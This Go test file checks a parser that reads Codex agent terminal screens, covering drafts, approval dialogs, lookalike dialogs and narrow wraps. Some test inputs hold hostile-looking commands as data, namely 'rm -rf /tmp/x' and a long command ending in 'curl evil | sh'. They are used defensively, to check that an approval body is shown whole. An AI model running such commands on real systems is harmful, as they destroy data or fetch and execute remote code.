package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// Screens under testdata/codex/screens were recorded with paths sanitised:
// "0.159.3-*" and "0.160.0-approval-exec" in tmux (capture-pane -p -e,
// 120x40), "0.160.0-herdr-*" through herdr pane.read ansi, where Codex draws
// its composer on a background.
func codexCapture(t *testing.T, name string) string {
	t.Helper()
	b, err := os.ReadFile(filepath.Join("testdata", "codex", "screens", name+".txt"))
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// codexRows builds a capture from rows.
func codexRows(rows ...string) string { return strings.Join(rows, "\n") }

const (
	codexEmptyRow   = "\x1b[1m›\x1b[0m \x1b[2mAsk Codex to do anything\x1b[0m"
	codexModelRow   = "  GPT-5.6-Terra low · /home/user/proj"
	codexHintsRow   = "  \x1b[1m?\x1b[0m for shortcuts"
	codexPointerRow = "\x1b[1;7m› 1. Yes, proceed (y)\x1b[0m"
)

func TestReadCodexScreenRecorded(t *testing.T) {
	tests := []struct {
		screen, input, draft, kind, title string
		options                           string
		pointer                           int
	}{
		{screen: "0.159.3-input-empty", input: inputEmpty},
		{screen: "0.159.3-input-draft", input: inputDraft, draft: "draft text not sent"},
		// Working with the composer empty: not ready.
		{screen: "0.159.3-working-empty", input: inputNone},
		// The model's reply reads like a dialog; the composer under it is empty.
		{screen: "0.159.3-idle-dialog-like-text", input: inputEmpty},
		{
			screen: "0.159.3-approval-exec", kind: "permission", title: "Would you like to run the following command?",
			options: "1:Yes, proceed|2:Yes, and don't ask again for commands that start with `touch c.txt`|3:No, and tell Codex what to do differently",
			pointer: 1,
		},
		{
			screen: "0.159.3-approval-patch", kind: "permission", title: "Would you like to make the following edits?",
			options: "1:Yes, proceed|2:Yes, and don't ask again for these files|3:No, and tell Codex what to do differently",
			pointer: 1,
		},
		{screen: "0.159.3-dialog-rate-limit-model", kind: "unsupported", title: "Approaching rate limits"},
		{
			screen: "0.160.0-approval-exec", kind: "permission", title: "Would you like to run the following command?",
			options: "1:Yes, proceed|2:Yes, and don't ask again for commands that start with `sleep 8`|3:No, and tell Codex what to do differently",
			pointer: 1,
		},
		{screen: "0.160.0-herdr-input-empty", input: inputEmpty},
		{screen: "0.160.0-herdr-input-draft", input: inputDraft, draft: "bản nháp chưa gửi"},
		// The working line goes on with a background terminal.
		{screen: "0.160.0-herdr-working-empty", input: inputNone},
		{
			screen: "0.160.0-herdr-approval-exec", kind: "permission", title: "Would you like to run the following command?",
			options: "1:Yes, proceed|2:Yes, and don't ask again for commands that start with `touch`|3:No, and tell Codex what to do differently",
			pointer: 1,
		},
	}
	for _, tt := range tests {
		t.Run(tt.screen, func(t *testing.T) {
			sc := readCodexScreen(codexCapture(t, tt.screen))
			if sc.input != tt.input || sc.draft != tt.draft {
				t.Fatalf("input %q draft %q, want %q %q", sc.input, sc.draft, tt.input, tt.draft)
			}
			if tt.kind == "" {
				if sc.prompt != nil || sc.sig != "" {
					t.Fatalf("prompt %+v sig %q, want none", sc.prompt, sc.sig)
				}
				return
			}
			p := sc.prompt
			if p == nil || sc.sig == "" {
				t.Fatalf("no prompt (sig %q)", sc.sig)
			}
			if p.Kind != tt.kind || p.Title != tt.title || codexOptionsText(p) != tt.options || p.pointer != tt.pointer {
				t.Fatalf("prompt %s %q %q pointer %d", p.Kind, p.Title, codexOptionsText(p), p.pointer)
			}
		})
	}
}

func codexOptionsText(p *AgentPrompt) string {
	var out []string
	for _, o := range p.Options {
		out = append(out, itoa10(o.Index)+":"+o.Label)
	}
	return strings.Join(out, "|")
}

func TestReadCodexScreenApprovalBody(t *testing.T) {
	exec := readCodexScreen(codexCapture(t, "0.159.3-approval-exec")).prompt
	if want := "Environment: local\nReason: May I create c.txt in the project directory?\n$ touch c.txt"; exec.Body != want {
		t.Fatalf("exec body %q", exec.Body)
	}
	patch := readCodexScreen(codexCapture(t, "0.159.3-approval-patch")).prompt
	if want := "Description: Apply proposed file edits\nDestination:\n/home/user/proj/a.txt\nDestination:\n/home/user/proj/d.txt"; patch.Body != want {
		t.Fatalf("patch body %q", patch.Body)
	}
	rate := readCodexScreen(codexCapture(t, "0.159.3-dialog-rate-limit-model")).prompt
	if rate.Body != "Switch to gpt-6-luna for lower credit usage?" || rate.PromptID != "" || len(rate.Options) != 0 {
		t.Fatalf("rate limit %+v", rate)
	}
}

// insertBefore puts rows into a capture right above its first row containing
// marker.
func insertBefore(t *testing.T, capture, marker string, rows ...string) string {
	t.Helper()
	lines := strings.Split(capture, "\n")
	for i, l := range lines {
		if strings.Contains(l, marker) {
			out := append(append(append([]string{}, lines[:i]...), rows...), lines[i:]...)
			return strings.Join(out, "\n")
		}
	}
	t.Fatalf("no row with %q", marker)
	return ""
}

func TestCodexDialogLookalikes(t *testing.T) {
	real := codexCapture(t, "0.159.3-approval-exec")
	want := readCodexScreen(real)

	// A title in an earlier history cell: the dialog under it is read, and
	// its identity is the real dialog's.
	earlier := insertBefore(t, real, "Running",
		"• Earlier reply:",
		"  Would you like to run the following command?",
		"  $ rm -rf /tmp/x",
		"")
	sc := readCodexScreen(earlier)
	if sc.prompt == nil || sc.prompt.Kind != "permission" || sc.prompt.Body != want.prompt.Body || sc.sig != want.sig {
		t.Fatalf("earlier lookalike: %+v sig %q, want %q", sc.prompt, sc.sig, want.sig)
	}

	// A title in the same stretch right above the dialog, or in the command
	// itself: which rows are the dialog is not known, so it is read only.
	for name, capture := range map[string]string{
		"above":   insertBefore(t, real, "Would you like to run", "  Would you like to run the following command?", "  $ rm -rf /tmp/x", ""),
		"command": insertBefore(t, real, "1. Yes, proceed", "  Would you like to run the following command?", "  $ rm -rf /tmp/x", ""),
	} {
		sc := readCodexScreen(capture)
		if sc.prompt == nil || sc.prompt.Kind != "unsupported" || len(sc.prompt.Options) != 0 || sc.sig == "" {
			t.Fatalf("%s: %+v", name, sc.prompt)
		}
	}

	// The model printing a dialog's rows with the composer under it is no
	// dialog.
	if sc := readCodexScreen(codexCapture(t, "0.159.3-idle-dialog-like-text")); sc.prompt != nil || sc.input != inputEmpty {
		t.Fatalf("history: %+v input %q", sc.prompt, sc.input)
	}
	// Without the approval footer under them, the title and options are a
	// dialog this code does not answer.
	bare := codexRows("• done", "",
		"  Would you like to run the following command?", "", "  $ touch c.txt", "", codexPointerRow, "  2. No (esc)")
	if sc := readCodexScreen(bare); sc.prompt == nil || sc.prompt.Kind != "unsupported" || len(sc.prompt.Options) != 0 {
		t.Fatalf("no footer: %+v", sc.prompt)
	}
}

func TestCodexDialogSignature(t *testing.T) {
	// A checkout on Windows may give the recording CRLF line ends.
	real := strings.ReplaceAll(codexCapture(t, "0.159.3-approval-exec"), "\r\n", "\n")
	a := readCodexScreen(real)
	// The pointer on option 2: the same dialog.
	moved := strings.Replace(real, "\x1b[1;7m› 1. Yes, proceed (y)\n\x1b[0m  2.", "\x1b[0m  1. Yes, proceed (y)\n\x1b[1;7m› 2.", 1)
	if moved == real {
		t.Fatal("pointer not moved")
	}
	b := readCodexScreen(moved)
	if b.sig != a.sig || b.prompt.pointer != 2 {
		t.Fatalf("moved pointer: sig %q vs %q, pointer %d", b.sig, a.sig, b.prompt.pointer)
	}
	// Another command: another dialog.
	other := readCodexScreen(strings.Replace(real, "c.txt", "d.txt", -1))
	if other.sig == a.sig {
		t.Fatal("a different command has the same signature")
	}
}

func TestReadCodexScreenNarrow(t *testing.T) {
	// A wrapped draft with Vietnamese text.
	draft := codexRows("• done", "",
		"\x1b[1m›\x1b[0m xin chào, đây là bản",
		"  nháp tiếng Việt",
		"", codexModelRow)
	if sc := readCodexScreen(draft); sc.input != inputDraft || sc.draft != "xin chào, đây là bản nháp tiếng Việt" {
		t.Fatalf("draft: %q %q", sc.input, sc.draft)
	}
	// The footer and an option wrapped by a narrow pane.
	approval := codexRows("• Running touch c.txt", "",
		"  Would you like to run the following command?", "",
		"  $ touch c.txt", "",
		codexPointerRow,
		"  2. Yes, and don't ask again for",
		"     commands that start with (p)",
		"  3. No, and tell Codex what to do (esc)", "",
		"  Press enter to confirm or esc",
		"  to cancel")
	sc := readCodexScreen(approval)
	if sc.prompt == nil || sc.prompt.Kind != "permission" ||
		codexOptionsText(sc.prompt) != "1:Yes, proceed|2:Yes, and don't ask again for commands that start with|3:No, and tell Codex what to do" {
		t.Fatalf("narrow approval: %+v", sc.prompt)
	}
	// The end of the footer alone, or a row of its own under it, is no footer.
	for name, capture := range map[string]string{
		"tail only":  codexRows("  $ touch c.txt", "", codexPointerRow, "", "to cancel"),
		"row after":  codexRows("  $ touch c.txt", "", codexPointerRow, "", "  Press enter to confirm or esc to cancel", "  x"),
		"head wraps": codexRows("  $ touch c.txt", "", codexPointerRow, "", "Press enter to confirm or esc", "  to cancel"),
	} {
		if sc := readCodexScreen(capture); sc.prompt != nil && sc.prompt.Kind == "permission" {
			t.Fatalf("%s: %+v", name, sc.prompt)
		}
	}
}

func TestReadCodexScreenComposer(t *testing.T) {
	tests := []struct {
		name, capture, input, draft string
	}{
		{"empty marker", codexRows("› ", "", codexModelRow), inputEmpty, ""},
		{"placeholder", codexRows(codexEmptyRow, "", codexModelRow, codexHintsRow), inputEmpty, ""},
		{"draft", codexRows("› fix the bug", "", codexModelRow), inputDraft, "fix the bug"},
		// Typed text that reads like an option is a draft.
		{"numbered draft", codexRows("› 1. Yes, proceed (y)", "", codexModelRow), inputDraft, "1. Yes, proceed (y)"},
		{"working with a draft", codexRows("• Working (9s • esc to interrupt)", "", "› next", "", codexModelRow), inputNone, ""},
		// More rows under it than the footer: a popup or an unknown screen.
		{"popup", codexRows("› /m", "", "  /model", "  /mention", "  /mcp", "  /more", codexModelRow), inputNone, ""},
		// The last row at column 0 is not the composer.
		{"other bottom", codexRows("› hello", "", "• reply"), inputNone, ""},
		{"empty", "", inputNone, ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			sc := readCodexScreen(tt.capture)
			if sc.input != tt.input || sc.draft != tt.draft || sc.prompt != nil {
				t.Fatalf("input %q draft %q prompt %+v", sc.input, sc.draft, sc.prompt)
			}
		})
	}
}

func TestReadCodexScreenUnknownDialogs(t *testing.T) {
	footer := "  Press enter to confirm or esc to cancel"
	tests := []struct {
		name, capture, kind, title string
	}{
		// The approval footer under a title this code does not know.
		{"unknown title", codexRows("• x", "", "  Allow network access?", "", codexPointerRow, "  2. No (esc)", "", footer), "unsupported", "Allow network access?"},
		// An option without its key, numbering that skips, more than nine.
		{"no key", codexRows("• x", "", "  Would you like to run the following command?", "", codexPointerRow, "  2. No", "", footer), "unsupported", "Would you like to run the following command?"},
		{"skips", codexRows("• x", "", "  Would you like to run the following command?", "", codexPointerRow, "  3. No (esc)", "", footer), "unsupported", "Would you like to run the following command?"},
		{"ten", codexRows(append(append([]string{"• x", "", "  Would you like to run the following command?", "", codexPointerRow},
			"  2. b (b)", "  3. c (c)", "  4. d (d)", "  5. e (e)", "  6. f (f)", "  7. g (g)", "  8. h (h)", "  9. i (i)", "  10. j (j)"), "", footer)...),
			"unsupported", "Would you like to run the following command?"},
		// No pointer drawn: the card is still the dialog, with none under it.
		{"no pointer", codexRows("• x", "", "  Would you like to run the following command?", "", "  1. Yes (y)", "  2. No (esc)", "", footer), "permission", "Would you like to run the following command?"},
		// A dialog with no rows above its options.
		{"no head", codexRows(codexPointerRow, "  2. No (esc)", "", "  enter select · esc back"), "unsupported", ""},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			sc := readCodexScreen(tt.capture)
			if sc.prompt == nil || sc.prompt.Kind != tt.kind || sc.prompt.Title != tt.title || sc.sig == "" {
				t.Fatalf("%+v sig %q", sc.prompt, sc.sig)
			}
			if tt.kind == "unsupported" && len(sc.prompt.Options) != 0 {
				t.Fatalf("unsupported card with options %+v", sc.prompt.Options)
			}
		})
	}

	// Screens that are no dialog at all.
	for name, capture := range map[string]string{
		"footer only":      codexRows("", "", footer),
		"footer, no block": codexRows("• x", "", "  some text", "", footer),
		"block not options": codexRows("• x", "", "  Would you like to run the following command?",
			"\x1b[7m› 1. Yes (y)\x1b[0m", "• not an option", "", footer),
		"pointer under history": codexRows("• x", "\x1b[7m› 2. b (b)\x1b[0m"),
		"bottom history":        codexRows("• x", "  y"),
	} {
		if sc := readCodexScreen(capture); sc.prompt != nil || sc.input != inputNone {
			t.Fatalf("%s: %+v input %q", name, sc.prompt, sc.input)
		}
	}
}

func TestCodexOptionsBlock(t *testing.T) {
	lines := parseScreen(codexRows("  title", "", "  wrapped first", "  1. a (a)"))
	// A row above the first option that is not one.
	if _, _, ok := codexOptions(lines, len(lines)); ok {
		t.Fatal("a block not starting with an option was read")
	}
	if _, _, ok := codexOptions(lines[:2], 2); ok {
		t.Fatal("a block of blank rows was read")
	}
}

// Each agent's reader rejects the other's screens.
func TestAgentScreensAreNotMixed(t *testing.T) {
	for _, name := range []string{"2.1.286-idle-fresh", "2.1.286-draft-short", "2.1.286-permission-bash", "2.1.286-ask-single"} {
		b, err := os.ReadFile(filepath.Join("testdata", "claude", "screens", name+".txt"))
		if err != nil {
			t.Fatal(err)
		}
		if sc := readCodexScreen(string(b)); sc.input != inputNone || sc.prompt != nil {
			t.Fatalf("claude %s read as codex: %q %+v", name, sc.input, sc.prompt)
		}
	}
	for _, name := range []string{"0.159.3-input-empty", "0.159.3-input-draft", "0.159.3-approval-exec", "0.159.3-approval-patch", "0.159.3-dialog-rate-limit-model"} {
		if sc := readClaudeScreen(codexCapture(t, name)); sc.input != inputNone || sc.prompt != nil {
			t.Fatalf("codex %s read as claude: %q %+v", name, sc.input, sc.prompt)
		}
	}
}

func TestReadAgentScreen(t *testing.T) {
	codex := codexCapture(t, "0.159.3-input-empty")
	if readAgentScreen("codex", codex).input != inputEmpty {
		t.Fatal("codex reader not used")
	}
	if readAgentScreen("claude", codex).input != inputNone {
		t.Fatal("claude reader not used")
	}
	if sc := readAgentScreen("pi", codex); sc.input != inputNone || sc.prompt != nil {
		t.Fatal("an agent without a reader was ready")
	}
}

// Reverse video is kept apart from a background: the option under Codex's
// pointer is the one, the composer in herdr the other.
func TestParseScreenReverse(t *testing.T) {
	l := parseScreen("\x1b[7mab\x1b[27mcd\x1b[48;2;1;2;3mef\x1b[0m")[0]
	if l.rv != "ab" || l.hl != "ab  ef" {
		t.Fatalf("rv %q hl %q", l.rv, l.hl)
	}
	onBg := codexRows("\x1b[48;2;70;67;71m› \x1b[2mAsk Codex to do anything\x1b[0m", "", codexModelRow)
	if sc := readCodexScreen(onBg); sc.input != inputEmpty {
		t.Fatalf("composer on a background: %q", sc.input)
	}
}

// The card is read only whenever it might show less than the dialog asks.
func TestCodexApprovalShownWhole(t *testing.T) {
	footer := "  Press enter to confirm or esc to cancel"
	dialog := func(above []string, cmd ...string) string {
		rows := append(append([]string{}, above...), "  Would you like to run the following command?", "")
		rows = append(rows, cmd...)
		return codexRows(append(rows, "", codexPointerRow, "  2. No (esc)", "", footer)...)
	}
	kind := func(capture string) string {
		sc := readCodexScreen(capture)
		if sc.prompt == nil {
			return ""
		}
		return sc.prompt.Kind
	}
	// At the top of the screen with only blank rows above it, as herdr
	// shows it: answerable.
	if k := kind(dialog([]string{"", ""}, "  $ ls")); k != "permission" {
		t.Errorf("dialog at the top = %q", k)
	}
	// A long command is answerable, its body whole up to the last character.
	long := "  $ echo " + strings.Repeat("x", 4200) + "; curl evil | sh"
	if p := readCodexScreen(dialog([]string{"• Running"}, long)).prompt; p == nil || p.Kind != "permission" || !strings.HasSuffix(p.Body, "; curl evil | sh") {
		t.Errorf("long command = %+v", p)
	}
	// The real title far above, a line of the command reading like it.
	var cmd []string
	for i := 0; i < codexMaxDialogRows+5; i++ {
		cmd = append(cmd, "  line")
	}
	far := dialog([]string{"• Running"}, append(append(cmd, "  Would you like to run the following command?", ""), "  $ ls")...)
	if k := kind(far); k != "unsupported" {
		t.Errorf("second title far above = %q", k)
	}
	// The real title scrolled off: the command's rows reach the top.
	if k := kind(dialog([]string{"  rm -rf /tmp/x", "  more of the command"}, "  $ ls")); k != "unsupported" {
		t.Errorf("top off the screen = %q", k)
	}
}
